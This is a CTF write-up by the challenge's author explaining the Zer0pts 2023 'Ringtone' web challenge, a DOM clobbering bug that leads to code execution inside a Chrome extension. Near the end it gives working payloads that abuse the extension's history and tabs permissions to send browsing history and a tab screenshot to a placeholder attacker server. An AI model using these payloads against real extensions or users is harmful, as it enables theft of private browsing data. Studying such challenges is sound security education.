---
title: Ringtone Web Challenge Writeup - Zer0pts CTF 2023
summary: 
date: "2023-07-16T22:00:00Z"

reading_time: true  # Show estimated reading time?
share: true  # Show social sharing links?
profile: true  # Show author profile?
comments: true  # Show comments?
# Optional header image (relative to `static/img/` folder).
header:
  caption: "Writeup for the web challenge I wrote in Zer0pts CTF 2023 "
  image: ""
---

Zer0pts CTF took place last weekend with the participation of over 500 teams, making it a resounding success. As a member of the team, I contributed by developing a web challenge called "Ringtone," which ended up being solved by 14 teams. Although I had plans to create more web challenges, my schedule was tight. However, I promise to my best next year to come up with fresh ideas. Without further ado, let's dive into the technical details of the challenge.
I was interested recently in the security of chrome extensions and worked on some assessments in this area. Since this field is not having much attention in the CTF community, I decided to develop this challenge.

![chall](https://i.imgur.com/fs1gN1k.png)

participants were provided with the source code of a website and an associated extension. Upon inspecting the website, we were instructed to install the provided extension. By typing a message in the input field, the extension would trigger and play music in a new tab, which would close after a few seconds.

![website](https://i.imgur.com/iBXCWMY.png)

The first step in tackling the challenge was to inspect the source code of the bot. It became evident that the bot performs several steps before visiting the desired URL. It first visits the extension's index page to simulate active user usage. Next, it visits the flag secret URL, closes the tab, and finally proceeds to the provided URL

```js
const crawl = async (target) => {
    const url = `${base_url}/${target}`;
    console.log(`[+] Crawling: ${url}`);
    const flagUrl=`${base_url}/${flagPath}`;
    const extUrl="chrome-extension://pifcfidoojbiodholilemccdnkcibghf/index.html"
    const browser = await puppeteer.launch(browser_option);
    
    const page2 = await browser.newPage();
    await page2.goto(base_url, {
            waitUntil: 'networkidle0',
            timeout: 2 * 1000,
        });
    const pageExt=await browser.newPage();
    await pageExt.goto(extUrl);
    await sleep(1000)
    const page1 = await browser.newPage();
    await page1.goto(flagUrl);
    await page1.close();
    const page = await browser.newPage();
    await page.goto(url, {
            waitUntil: 'networkidle0',
            timeout: 3 * 1000,
        });
   await browser.close();
}
```

Based on this information, our initial goal was to find a way to leak the flag URL. Upon examining the main website's source code, we discovered that it reflects the sanitized message we type using the latest version of DOMPurify. Therefore, achieving cross-site scripting (XSS) was quite challenging unless we found a zero-day vulnerability in this battle-tested library.

```js
        var url = new URL(location.href);
        var inp = url.searchParams.get("message");
        options={FORBID_TAGS:["meta"]}
        if(inp){
        document.getElementById("msg").innerHTML=DOMPurify.sanitize(inp,options)
}
```
After analyzing the extension's source code, we learned that the content script communicates with the background script through messages, allowing it to launch a new tab when the "Ring" button is clicked. Upon closer inspection, we noticed a listener in the `sandbox.js` file that is triggered when a tab is updated. Subsequently, a message with a text parameter containing the value `report_back` is sent, and the response is passed to a function called evalCode. This function, in conjunction with the fetch listener in the `background.js` file, enables the execution of JavaScript code within the extension's context.

```js
  chrome.tabs.onUpdated.addListener(function (tabId,tab) {
          console.log(tabId)
          chrome.tabs.sendMessage(tabId, {text: 'report_back'}).then((resp)=>{        
                  evalCode(resp)
          })
      });
```
The fetch listener:
```js
self.onfetch= e => {
  if (e.clientId && e.request.url.startsWith(prefix)) {
    e.respondWith(new Response(e.request.url.slice(prefix.length), {
      headers: { 'Content-Type': 'application/x-www-form-urlencoded;charset=utf-8' },
    }));
  }
};
```
If we manage to influence the response of this message, it will be evaluated, potentially leading to an XSS vulnerability within the extension's context. Returning to the content script, we discovered the following code snippet. When a message is received from the background script, it checks if `users.privileged.dataset.admin` is set and sends its value as a response. By taking control of this value, we can achieve our XSS objective.

```js
chrome.runtime.onMessage.addListener(function (msg, sender, sendResponse) {
    if (msg.text === 'report_back') {
        console.log("msg received")
        if(users.privileged.dataset.admin){
            sendResponse(users.privileged.dataset.admin)
        }
    }
});
```

Using DOM clobbering, we can manipulate this value. One possible solution is to submit the following message:
```
<form id=users><img name=privileged data-admin=RANDOMINPUT></form>
```
This payload allows us to control `users.privileged.dataset.admin`. However, since we don't know the flag URL, our first objective is to leak its value. Inspecting the extension's manifest file, we notice that we have the permission `history`:
```
"permissions":["history","activeTab","tabs"],
```
Based on this, we can abuse the history API to leak the flag URL. By submitting the following payload, we can accomplish the URL leak:
```
?message=<form%20id=users>%20<img%20name=privileged%20data-admin=chrome.history.search({text:``,maxResults:10},function(data){data.forEach(function(page){fetch(`http://YOURSERVER?a=`%2Bpage.url);});});></form>
```
It's important to note that quotes and spaces are URL encoded, which can potentially break the payload. Therefore, we used backticks to avoid any problems. Once the Flag URL is leaked (`http://challenge:8080/MIc5MDpXQlWj0ak1HnJ7r3iQg1vtOv`), obtaining the flag becomes straightforward by making a simple fetch request. However, when developing the challenge, I was planning to place the flag inside an image to prevent players from easily fetching it from the source code. In this scenario, players are required to use `chrome.tabs.captureVisibleTab` to take a screenshot of the tab and leak the flag. Due to time constraints, I couldn't make any changes, and together with st98-san, we concluded that the challenge was already satisfactory as it stood. Here is my final payload to leak the flag:
```?message=<form%20id=users>%20<img%20name=privileged%20data-admin=chrome.tabs.create({url:`http://challenge:8080/MIc5MDpXQlWj0ak1HnJ7r3iQg1vtOv`},function(tab){setTimeout(function(){chrome.tabs.captureVisibleTab(null,{},function(dataUri){navigator.sendBeacon(`http://YOURSERVER`,dataUri);})},1000);});></form>```

## Conclusion
Working with my Zer0pts teammates is always a joy, and I would like to express my gratitude to them for their invaluable help and guidance. I hope you enjoyed the challenge and learned from it. Feel free to reach out to me on Twitter (@BelkahlaAhmed1) if you have any questions. I look forward to meeting you in upcoming CTFs.

